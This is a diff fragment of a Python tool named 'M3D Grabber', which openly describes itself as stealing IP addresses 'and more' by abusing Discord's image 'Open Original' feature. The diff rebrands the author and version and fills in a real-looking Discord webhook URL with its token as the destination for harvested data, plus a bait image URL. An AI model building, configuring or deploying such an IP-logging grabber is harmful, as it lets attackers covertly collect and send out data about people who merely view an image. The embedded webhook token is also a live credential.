@@ -7,13 +7,13 @@ import traceback, requests, base64, httpagentparser
 
 __app__ = "M3D Grabber"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__version__ = "V1.0"
+__author__ = "M3D"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://ptb.discord.com/api/webhooks/1437918673347280938/LF-DQTY6E_mVQ4ZaxOteWik52uRjbdFWHnzkLNxEl-fdOTtzUK5hjawIWQKdT62KnPEh",
+    "image": "https://t4.ftcdn.net/jpg/01/19/57/35/360_F_119573545_GG2InFhUQoAKapERTIyxq9ndBsIge6dl.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
